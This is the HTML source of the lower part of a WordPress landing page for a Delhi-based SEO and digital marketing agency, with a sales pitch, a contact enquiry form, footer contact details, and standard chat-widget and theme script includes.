																										marketing
																										agency</strong></em>
																								if you’re interested in
																								the following: Increased
																								rankings in the SERPs
																								and more organic traffic
																								Increased leads, sales
																								and revenue and growth
																								for your business An
																								understanding of your
																								website traffic, its
																								breakdown, and its
																								contribution to the
																								business a solid footing
																								in a new geographic area
																								Getting ahead of your
																								competitors Long-term
																								growth for your business
																								a cost-effective way of
																								connecting with users
																								with high intent a
																								partner that understands
																								the nuances of digital
																								marketing and will help
																								you grow through focused
																								efforts an outside
																								perspective in improving
																								user experience on your
																								website.</p>

																						</div>
																					</div>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						
							<div id="contact"
								class="vc_row wpb_row section vc_row-fluid  vc_custom_1592391764067 grid_section"
								style=' text-align:left;'>
								<div class=" section_inner clearfix">
									<div class='section_inner_margin clearfix'>
										<div class="wpb_column vc_column_container vc_col-sm-12">
											<div class="vc_column-inner">
												<div class="wpb_wrapper">
													<div class="vc_row wpb_row section vc_row-fluid vc_inner "
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-12">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_text_column wpb_content_element ">
																			<div class="wpb_wrapper">
																				<h2 style="text-align: center;"><span
																						style="color: #ffffff;">Don&#8217;t
																						Wait Any Longer For Higher
																						Rankings. Get Started
																						Today!</span></h2>

																			</div>
																		</div>
																		<div
																			class="wpb_text_column wpb_content_element  vc_custom_1592385680081">
																			<div class="wpb_wrapper">
																				<p style="text-align: center;"><span
																						style="color: #ffffff;">Call
																						us: <strong><a
																								style="color: #ffffff;"
																								title=""
																								href="tel:+91-8285635636"
																								data-original-title="+91-8285635636">+91-8285635636</a></strong>,
																						email us: <span
																							class="salesEmail"><a
																								style="color: #ffffff;"
																								href="mailto:info@webuthinks.com">info@webuthinks.com</a></span> OR
																						just fill up the form
																						below.</span></p>

																			</div>
																		</div>
																		<div role="form" class="wpcf7"
																			id="wpcf7-f122-p21-o2" lang="en-US"
																			dir="ltr">
																			<div class="screen-reader-response">
																				<p role="status" aria-live="polite"
																					aria-atomic="true"></p>
																				<ul></ul>
																			</div>
																			<form
																				action="https://www.eliteseoagency.com/#wpcf7-f122-p21-o2"
																				method="post"
																				class="wpcf7-form init default"
																				novalidate="novalidate"
																				data-status="init">
																				<div style="display: none;">
																					<input type="hidden" name="_wpcf7"
																						value="122" />
																					<input type="hidden"
																						name="_wpcf7_version"
																						value="5.4.1" />
																					<input type="hidden"
																						name="_wpcf7_locale"
																						value="en_US" />
																					<input type="hidden"
																						name="_wpcf7_unit_tag"
																						value="wpcf7-f122-p21-o2" />
																					<input type="hidden"
																						name="_wpcf7_container_post"
																						value="21" />
																					<input type="hidden"
																						name="_wpcf7_posted_data_hash"
																						value="" />
																					<input type="hidden"
																						name="_wpcf7_recaptcha_response"
																						value="" />
																				</div>
																				<div class="Enquiry-contact-Form">
																					<div
																						class="wpb_column  vc_col-sm-6">
																						<label> <span
																								class="wpcf7-form-control-wrap your-name"><input
																									type="text"
																									name="your-name"
																									value="" size="40"
																									class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required"
																									aria-required="true"
																									aria-invalid="false"
																									placeholder="Your Name" /></span>
																						</label>
																					</div>
																					<div
																						class="wpb_column  vc_col-sm-6">
																						<label> <span
																								class="wpcf7-form-control-wrap your-email"><input
																									type="email"
																									name="your-email"
																									value="" size="40"
																									class="wpcf7-form-control wpcf7-text wpcf7-email wpcf7-validates-as-required wpcf7-validates-as-email"
																									aria-required="true"
																									aria-invalid="false"
																									placeholder="Your Email" /></span>
																						</label>
																					</div>
																					<div
																						class="wpb_column  vc_col-sm-6">
																						<label> <span
																								class="wpcf7-form-control-wrap Phone"><input
																									type="tel"
																									name="Phone"
																									value="" size="40"
																									class="wpcf7-form-control wpcf7-text wpcf7-tel wpcf7-validates-as-required wpcf7-validates-as-tel"
																									aria-required="true"
																									aria-invalid="false"
																									placeholder="Phone No." /></span>
																						</label>
																					</div>
																					<div
																						class="wpb_column  vc_col-sm-6">
																						<label> <span
																								class="wpcf7-form-control-wrap websiteurl"><input
																									type="text"
																									name="websiteurl"
																									value="" size="40"
																									class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required"
																									aria-required="true"
																									aria-invalid="false"
																									placeholder="website url (if you have)" /></span>
																						</label>
																					</div>
																					<div
																						class="wpb_column  vc_col-sm-12">
																						<label> <span
																								class="wpcf7-form-control-wrap your-message"><textarea
																									name="your-message"
																									cols="40" rows="10"
																									class="wpcf7-form-control wpcf7-textarea"
																									aria-invalid="false"
																									placeholder="Your Message"></textarea></span>
																						</label>
																					</div>
																					<div
																						class="wpb_column  vc_col-sm-12 my-btn-send-a">
																						<input type="submit"
																							value="Send"
																							class="wpcf7-form-control wpcf7-submit" />
																					</div>
																				</div>
																				<div class="wpcf7-response-output"
																					aria-hidden="true"></div>
																			</form>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>

						</div>
					</div>

				</div>
			</div>



			<footer>
				<div class="footer_inner clearfix">
					<div class="footer_top_holder">
						<div class="footer_top">
							<div class="container">
								<div class="container_inner">
									<div class="four_columns clearfix">
										<div class="column1 footer_col1">
											<div class="column_inner">
												<div id="custom_html-7" class="widget_text widget widget_custom_html">
													<h5>Our SEO Agency</h5>
													<div class="textwidget custom-html-widget">webuthink Pvt Ltd is a
														Leading Digital Marketing Service Provider Company, offering a
														complete range of Online Marketing Services including Digital
														Marketing,</div>
												</div>
											</div>
										</div>
										<div class="column2 footer_col2">
											<div class="column_inner">
												<div id="nav_menu-2" class="widget widget_nav_menu">
													<h5>More about us</h5>
													<div class="menu-footer-menu-container">
														<ul id="menu-footer-menu" class="menu">
															<li id="menu-item-23"
																class="menu-item menu-item-type-custom menu-item-object-custom menu-item-23">
																<a href="#Services">Our Services</a></li>
															<li id="menu-item-24"
																class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24">
																<a href="#Why">Why Choose Us</a></li>
															<li id="menu-item-25"
																class="menu-item menu-item-type-custom menu-item-object-custom menu-item-25">
																<a href="#Our">Our Working Are</a></li>
															<li id="menu-item-26"
																class="menu-item menu-item-type-custom menu-item-object-custom menu-item-26">
																<a href="#Free">Free Consultation</a></li>
															<li id="menu-item-27"
																class="menu-item menu-item-type-custom menu-item-object-custom menu-item-27">
																<a href="#contact">Get in Touch</a></li>
														</ul>
													</div>
												</div>
											</div>
										</div>
										<div class="column3 footer_col3">
											<div class="column_inner">
												<div id="custom_html-8" class="widget_text widget widget_custom_html">
													<h5>Connect with us</h5>
													<div class="textwidget custom-html-widget">
														<div class="call-number-office">
															<ul>
																<li><a href="tel:+91-8285635636"><img
																			data-src="https://www.eliteseoagency.com/wp-content/uploads/2020/06/INDIA_LOGO.png"
																			class="img-responsive lazyload"
																			src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																				src="wp-content/uploads/2020/06/INDIA_LOGO.png"
																				class="img-responsive"></noscript>+91-8285635636</a>
																</li>
																
																<li><a href="mailto:nfo@eliteseo.agency"><img
																			data-src="https://www.eliteseoagency.com/wp-content/uploads/2020/06/apple-mail.png"
																			class="img-responsive lazyload"
																			src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																				src="wp-content/uploads/2020/06/apple-mail.png"
																				class="img-responsive"></noscript>info@webuthink.com</a>
																</li>
															</ul>


														</div>
													</div>
												</div>
											</div>
										</div>
										<div class="column4 footer_col4">
											<div class="column_inner">
												<div id="custom_html-9" class="widget_text widget widget_custom_html">
													<h5>India Office</h5>
													<div class="textwidget custom-html-widget"><a
															href="https://g.page/eliteseoagencyindia?share">Office Number - 606, 6th Floor, ITL TOWER-B08, NETAJI SUBHASH PLACE, Netaji Subhash Place, Pitampura, Delhi, 110034</a>
													</div>
												</div>
												
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
					<div class="footer_bottom_holder">
						<div class="two_columns_50_50 footer_bottom_columns clearfix">
							<div class="column1 footer_bottom_column">
								<div class="column_inner">
									<div class="footer_bottom">
										<div class="textwidget custom-html-widget">
											<div class="">
												Copyright © 2020 <strong>webuthink Pvt Ltd</strong>. All rights
												reserved.
											</div>
										</div>
									</div>
								</div>
							</div>
							<div class="column2 footer_bottom_column">
								<div class="column_inner">
									<div class="footer_bottom">
										<div class="textwidget custom-html-widget">
											<div class="Header-top-right-2 footer-s-icon">
												<ul>
													<li>Follow us on:</li>
													<li class="ficon1"><a
															href="https://www.facebook.com//"><i
																class="fa fa-facebook" aria-hidden="true"></i></a></li>
													<li class="ficon2"><a href="https://twitter.com/"><i
																class="fa fa-twitter" aria-hidden="true"></i></a></li>
													<li class="ficon3"><a
															href="https://www.instagram.com//"><i
																class="fa fa-instagram" aria-hidden="true"></i></a></li>
													<li class="ficon4"><a href="#"><i class="fa fa-youtube-play"
																aria-hidden="true"></i></a></li>
													<li class="ficon4"><a href="skype:live:"><i
																class="fa fa-skype" aria-hidden="true"></i>
														</a></li>
												</ul>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</footer>

		</div>
	</div>
	<!--Start of Tawk.to Script (0.5.4)-->
	<script type="text/javascript">
		var Tawk_API = Tawk_API || {};
		var Tawk_LoadStart = new Date();
		(function () {
			var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
			s1.async = true;
			s1.src = 'https://embed.tawk.to/5ee1bc684a7c6258179a5e64/default';
			s1.charset = 'UTF-8';
			s1.setAttribute('crossorigin', '*');
			s0.parentNode.insertBefore(s1, s0);
		})();
	</script>
	<!--End of Tawk.to Script (0.5.4)-->
	<!-- GetButton.io widget -->
	<script type="text/javascript">
		(function () {
			var options = {
				whatsapp: "+918285635636", // WhatsApp number
				call: "+918285635636", // Call phone number
				call_to_action: "Message us", // Call to action
				button_color: "#A8CE50", // Color of button
				position: "left", // Position may be 'right' or 'left'
				order: "whatsapp,call", // Order of buttons
			};
			var proto = document.location.protocol, host = "getbutton.io", url = proto + "//static." + host;
			var s = document.createElement('script'); s.type = 'text/javascript'; s.async = true; s.src = url + '/widget-send-button/js/init.js';
			s.onload = function () { WhWidgetSendButton.init(host, proto, options); };
			var x = document.getElementsByTagName('script')[0]; x.parentNode.insertBefore(s, x);
		})();
	</script>
	<!-- /GetButton.io widget -->
	<script type="text/html" id="wpb-modifications"></script>
	<script type='text/javascript' src='wp-includes/js/dist/vendor/wp-polyfill.min89b1.js?ver=7.4.4'
		id='wp-polyfill-js'></script>
	<script type='text/javascript' id='wp-polyfill-js-after'>
		('fetch' in window) || document.write('<script src="wp-includes/js/dist/vendor/wp-polyfill-fetch.min6e0e.js?ver=3.0.0"></scr' + 'ipt>'); (document.contains) || document.write('<script src="wp-includes/js/dist/vendor/wp-polyfill-node-contains.min2e00.js?ver=3.42.0"></scr' + 'ipt>'); (window.DOMRect) || document.write('<script src="wp-includes/js/dist/vendor/wp-polyfill-dom-rect.min2e00.js?ver=3.42.0"></scr' + 'ipt>'); (window.URL && window.URL.prototype && window.URLSearchParams) || document.write('<script src="wp-includes/js/dist/vendor/wp-polyfill-url.min5aed.js?ver=3.6.4"></scr' + 'ipt>'); (window.FormData && window.FormData.prototype.keys) || document.write('<script src="wp-includes/js/dist/vendor/wp-polyfill-formdata.mine9bd.js?ver=3.0.12"></scr' + 'ipt>'); (Element.prototype.matches && Element.prototype.closest) || document.write('<script src="wp-includes/js/dist/vendor/wp-polyfill-element-closest.min4c56.js?ver=2.0.2"></scr' + 'ipt>'); ('objectFit' in document.documentElement.style) || document.write('<script src="wp-includes/js/dist/vendor/wp-polyfill-object-fit.min531b.js?ver=2.3.4"></scr' + 'ipt>');
	</script>
	<script type='text/javascript' id='contact-form-7-js-extra'>
		/* <![CDATA[ */
		var wpcf7 = { "api": { "root": "https:\/\/www.eliteseoagency.com\/wp-json\/", "namespace": "contact-form-7\/v1" } };
/* ]]> */
	</script>
	<script type='text/javascript' src='wp-content/plugins/contact-form-7/includes/js/indexc225.js?ver=5.4.1'
		id='contact-form-7-js'></script>
	<script type='text/javascript' id='wpcf7-redirect-script-js-extra'>
		/* <![CDATA[ */
		var wpcf7r = { "ajax_url": "https:\/\/www.eliteseoagency.com\/wp-admin\/admin-ajax.php" };
/* ]]> */
	</script>
	<script type='text/javascript'
		src='wp-content/plugins/wpcf7-redirect/build/js/wpcf7-redirect-frontend-script4963.js?ver=1.1'
		id='wpcf7-redirect-script-js'></script>
	<script type='text/javascript'
		src='wp-content/plugins/wp-smushit/app/assets/js/smush-lazy-load.min38b5.js?ver=3.8.5'
		id='smush-lazy-load-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/core.min35d0.js?ver=1.12.1'
		id='jquery-ui-core-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/accordion.min35d0.js?ver=1.12.1'
		id='jquery-ui-accordion-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/menu.min35d0.js?ver=1.12.1'
		id='jquery-ui-menu-js'></script>
	<script type='text/javascript' src='wp-includes/js/dist/dom-ready.mine02e.js?ver=93db39f6fe07a70cb9217310bec0a531'
		id='wp-dom-ready-js'></script>
	<script type='text/javascript' src='wp-includes/js/dist/hooks.minc5c2.js?ver=d0188aa6c336f8bb426fe5318b7f5b72'
		id='wp-hooks-js'></script>
	<script type='text/javascript' src='wp-includes/js/dist/i18n.min802d.js?ver=6ae7d829c963a7d8856558f3f9b32b43'
		id='wp-i18n-js'></script>
	<script type='text/javascript' id='wp-i18n-js-after'>
		wp.i18n.setLocaleData({ 'text direction\u0004ltr': ['ltr'] });
	</script>
	<script type='text/javascript' id='wp-a11y-js-translations'>
		(function (domain, translations) {
			var localeData = translations.locale_data[domain] || translations.locale_data.messages;
			localeData[""].domain = domain;
			wp.i18n.setLocaleData(localeData, domain);
		})("default", { "locale_data": { "messages": { "": {} } } });
	</script>
	<script type='text/javascript' src='wp-includes/js/dist/a11y.minacbb.js?ver=f38c4dee80fd4bb43131247e3175c99a'
		id='wp-a11y-js'></script>
	<script type='text/javascript' id='jquery-ui-autocomplete-js-extra'>
		/* <![CDATA[ */
		var uiAutocompleteL10n = { "noResults": "No results found.", "oneResult": "1 result found. Use up and down arrow keys to navigate.", "manyResults": "%d results found. Use up and down arrow keys to navigate.", "itemSelected": "Item selected." };
/* ]]> */
	</script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/autocomplete.min35d0.js?ver=1.12.1'
		id='jquery-ui-autocomplete-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/controlgroup.min35d0.js?ver=1.12.1'
		id='jquery-ui-controlgroup-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/checkboxradio.min35d0.js?ver=1.12.1'
		id='jquery-ui-checkboxradio-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/button.min35d0.js?ver=1.12.1'
		id='jquery-ui-button-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/datepicker.min35d0.js?ver=1.12.1'
		id='jquery-ui-datepicker-js'></script>
	<script type='text/javascript' id='jquery-ui-datepicker-js-after'>
		jQuery(document).ready(function (jQuery) { jQuery.datepicker.setDefaults({ "closeText": "Close", "currentText": "Today", "monthNames": ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"], "monthNamesShort": ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"], "nextText": "Next", "prevText": "Previous", "dayNames": ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"], "dayNamesShort": ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"], "dayNamesMin": ["S", "M", "T", "W", "T", "F", "S"], "dateFormat": "MM d, yy", "firstDay": 1, "isRTL": false }); });
	</script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/mouse.min35d0.js?ver=1.12.1'
		id='jquery-ui-mouse-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/resizable.min35d0.js?ver=1.12.1'
		id='jquery-ui-resizable-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/draggable.min35d0.js?ver=1.12.1'
		id='jquery-ui-draggable-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/dialog.min35d0.js?ver=1.12.1'
		id='jquery-ui-dialog-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/droppable.min35d0.js?ver=1.12.1'
		id='jquery-ui-droppable-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/progressbar.min35d0.js?ver=1.12.1'
		id='jquery-ui-progressbar-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/selectable.min35d0.js?ver=1.12.1'
		id='jquery-ui-selectable-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/sortable.min35d0.js?ver=1.12.1'
		id='jquery-ui-sortable-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/slider.min35d0.js?ver=1.12.1'
		id='jquery-ui-slider-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/spinner.min35d0.js?ver=1.12.1'
		id='jquery-ui-spinner-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/tooltip.min35d0.js?ver=1.12.1'
		id='jquery-ui-tooltip-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/tabs.min35d0.js?ver=1.12.1'
		id='jquery-ui-tabs-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/effect.min35d0.js?ver=1.12.1'
		id='jquery-effects-core-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/effect-blind.min35d0.js?ver=1.12.1'
		id='jquery-effects-blind-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/effect-bounce.min35d0.js?ver=1.12.1'
		id='jquery-effects-bounce-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/effect-clip.min35d0.js?ver=1.12.1'
		id='jquery-effects-clip-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/effect-drop.min35d0.js?ver=1.12.1'
		id='jquery-effects-drop-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/effect-explode.min35d0.js?ver=1.12.1'
		id='jquery-effects-explode-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/effect-fade.min35d0.js?ver=1.12.1'
		id='jquery-effects-fade-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/effect-fold.min35d0.js?ver=1.12.1'
		id='jquery-effects-fold-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/effect-highlight.min35d0.js?ver=1.12.1'
		id='jquery-effects-highlight-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/effect-pulsate.min35d0.js?ver=1.12.1'
		id='jquery-effects-pulsate-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/effect-size.min35d0.js?ver=1.12.1'
		id='jquery-effects-size-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/effect-scale.min35d0.js?ver=1.12.1'
		id='jquery-effects-scale-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/effect-shake.min35d0.js?ver=1.12.1'
		id='jquery-effects-shake-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/effect-slide.min35d0.js?ver=1.12.1'
		id='jquery-effects-slide-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/ui/effect-transfer.min35d0.js?ver=1.12.1'
		id='jquery-effects-transfer-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/doubletaptogofcc2.js?ver=5.7.9'
		id='doubleTapToGo-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/modernizr.minfcc2.js?ver=5.7.9'
		id='modernizr-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/jquery.appearfcc2.js?ver=5.7.9'
		id='appear-js'></script>
	<script type='text/javascript' src='wp-includes/js/hoverIntent.minc245.js?ver=1.8.1' id='hoverIntent-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/counterfcc2.js?ver=5.7.9'
		id='counter-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/easypiechartfcc2.js?ver=5.7.9'
		id='easyPieChart-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/mixitupfcc2.js?ver=5.7.9'
		id='mixItUp-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/jquery.prettyPhotofcc2.js?ver=5.7.9'
		id='prettyphoto-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/jquery.fitvidsfcc2.js?ver=5.7.9'
		id='fitvids-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/jquery.flexslider-minfcc2.js?ver=5.7.9'
		id='flexslider-js'></script>
	<script type='text/javascript' id='mediaelement-core-js-before'>
		var mejsL10n = { "language": "en", "strings": { "mejs.download-file": "Download File", "mejs.install-flash": "You are using a browser that does not have Flash player enabled or installed. Please turn on your Flash player plugin or download the latest version from https:\/\/get.adobe.com\/flashplayer\/", "mejs.fullscreen": "Fullscreen", "mejs.play": "Play", "mejs.pause": "Pause", "mejs.time-slider": "Time Slider", "mejs.time-help-text": "Use Left\/Right Arrow keys to advance one second, Up\/Down arrows to advance ten seconds.", "mejs.live-broadcast": "Live Broadcast", "mejs.volume-help-text": "Use Up\/Down Arrow keys to increase or decrease volume.", "mejs.unmute": "Unmute", "mejs.mute": "Mute", "mejs.volume-slider": "Volume Slider", "mejs.video-player": "Video Player", "mejs.audio-player": "Audio Player", "mejs.captions-subtitles": "Captions\/Subtitles", "mejs.captions-chapters": "Chapters", "mejs.none": "None", "mejs.afrikaans": "Afrikaans", "mejs.albanian": "Albanian", "mejs.arabic": "Arabic", "mejs.belarusian": "Belarusian", "mejs.bulgarian": "Bulgarian", "mejs.catalan": "Catalan", "mejs.chinese": "Chinese", "mejs.chinese-simplified": "Chinese (Simplified)", "mejs.chinese-traditional": "Chinese (Traditional)", "mejs.croatian": "Croatian", "mejs.czech": "Czech", "mejs.danish": "Danish", "mejs.dutch": "Dutch", "mejs.english": "English", "mejs.estonian": "Estonian", "mejs.filipino": "Filipino", "mejs.finnish": "Finnish", "mejs.french": "French", "mejs.galician": "Galician", "mejs.german": "German", "mejs.greek": "Greek", "mejs.haitian-creole": "Haitian Creole", "mejs.hebrew": "Hebrew", "mejs.hindi": "Hindi", "mejs.hungarian": "Hungarian", "mejs.icelandic": "Icelandic", "mejs.indonesian": "Indonesian", "mejs.irish": "Irish", "mejs.italian": "Italian", "mejs.japanese": "Japanese", "mejs.korean": "Korean", "mejs.latvian": "Latvian", "mejs.lithuanian": "Lithuanian", "mejs.macedonian": "Macedonian", "mejs.malay": "Malay", "mejs.maltese": "Maltese", "mejs.norwegian": "Norwegian", "mejs.persian": "Persian", "mejs.polish": "Polish", "mejs.portuguese": "Portuguese", "mejs.romanian": "Romanian", "mejs.russian": "Russian", "mejs.serbian": "Serbian", "mejs.slovak": "Slovak", "mejs.slovenian": "Slovenian", "mejs.spanish": "Spanish", "mejs.swahili": "Swahili", "mejs.swedish": "Swedish", "mejs.tagalog": "Tagalog", "mejs.thai": "Thai", "mejs.turkish": "Turkish", "mejs.ukrainian": "Ukrainian", "mejs.vietnamese": "Vietnamese", "mejs.welsh": "Welsh", "mejs.yiddish": "Yiddish" } };
	</script>
	<script type='text/javascript' src='wp-includes/js/mediaelement/mediaelement-and-player.min08e1.js?ver=4.2.16'
		id='mediaelement-core-js'></script>
	<script type='text/javascript' src='wp-includes/js/mediaelement/mediaelement-migrate.minfcc2.js?ver=5.7.9'
		id='mediaelement-migrate-js'></script>
	<script type='text/javascript' id='mediaelement-js-extra'>
		/* <![CDATA[ */
		var _wpmejsSettings = { "pluginPath": "\/wp-includes\/js\/mediaelement\/", "classPrefix": "mejs-", "stretching": "responsive" };
/* ]]> */
	</script>
	<script type='text/javascript' src='wp-includes/js/mediaelement/wp-mediaelement.minfcc2.js?ver=5.7.9'
		id='wp-mediaelement-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/infinitescroll.minfcc2.js?ver=5.7.9'
		id='infiniteScroll-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/jquery.waitforimagesfcc2.js?ver=5.7.9'
		id='waitforimages-js'></script>
	<script type='text/javascript' src='wp-includes/js/jquery/jquery.form.min50fa.js?ver=4.2.1'
		id='jquery-form-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/waypoints.minfcc2.js?ver=5.7.9'
		id='waypoints-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/jplayer.minfcc2.js?ver=5.7.9'
		id='jplayer-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/bootstrap.carouselfcc2.js?ver=5.7.9'
		id='bootstrapCarousel-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/skrollrfcc2.js?ver=5.7.9'
		id='skrollr-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/Chart.minfcc2.js?ver=5.7.9'
		id='charts-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/jquery.easing.1.3fcc2.js?ver=5.7.9'
		id='easing-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/abstractBaseClassfcc2.js?ver=5.7.9'
		id='abstractBaseClass-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/jquery.countdownfcc2.js?ver=5.7.9'
		id='countdown-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/jquery.multiscroll.minfcc2.js?ver=5.7.9'
		id='multiscroll-js'></script>
	<script type='text/javascript'
		src='wp-content/themes/bridge/js/plugins/jquery.justifiedGallery.minfcc2.js?ver=5.7.9'
		id='justifiedGallery-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/bigtextfcc2.js?ver=5.7.9'
		id='bigtext-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/jquery.sticky-kit.minfcc2.js?ver=5.7.9'
		id='stickyKit-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/owl.carousel.minfcc2.js?ver=5.7.9'
		id='owlCarousel-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/typedfcc2.js?ver=5.7.9'
		id='typed-js'></script>
	<script type='text/javascript'
		src='wp-content/themes/bridge/js/plugins/jquery.carouFredSel-6.2.1.minfcc2.js?ver=5.7.9'
		id='carouFredSel-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/lemmon-slider.minfcc2.js?ver=5.7.9'
		id='lemmonSlider-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/jquery.fullPage.minfcc2.js?ver=5.7.9'
		id='one_page_scroll-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/jquery.mousewheel.minfcc2.js?ver=5.7.9'
		id='mousewheel-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/jquery.touchSwipe.minfcc2.js?ver=5.7.9'
		id='touchSwipe-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/jquery.isotope.minfcc2.js?ver=5.7.9'
		id='isotope-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/packery-mode.pkgd.minfcc2.js?ver=5.7.9'
		id='packery-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/jquery.stretchfcc2.js?ver=5.7.9'
		id='stretch-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/imagesloadedfcc2.js?ver=5.7.9'
		id='imagesLoaded-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/rangeslider.minfcc2.js?ver=5.7.9'
		id='rangeSlider-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/jquery.event.movefcc2.js?ver=5.7.9'
		id='eventMove-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/jquery.twentytwentyfcc2.js?ver=5.7.9'
		id='twentytwenty-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/swiper.minfcc2.js?ver=5.7.9'
		id='swiper-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/TweenLite.minfcc2.js?ver=5.7.9'
		id='TweenLite-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/ScrollToPlugin.minfcc2.js?ver=5.7.9'
		id='ScrollToPlugin-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/smoothPageScroll.minfcc2.js?ver=5.7.9'
		id='smoothPageScroll-js'></script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/default_dynamicb49a.js?ver=1592656265'
		id='bridge-default-dynamic-js'></script>
	<script type='text/javascript' id='bridge-default-js-extra'>
		/* <![CDATA[ */
		var QodeAdminAjax = { "ajaxurl": "https:\/\/www.eliteseoagency.com\/wp-admin\/admin-ajax.php" };
		var qodeGlobalVars = { "vars": { "qodeAddingToCartLabel": "Adding to Cart...", "page_scroll_amount_for_sticky": "" } };
/* ]]> */
	</script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/default.minfcc2.js?ver=5.7.9'
		id='bridge-default-js'></script>
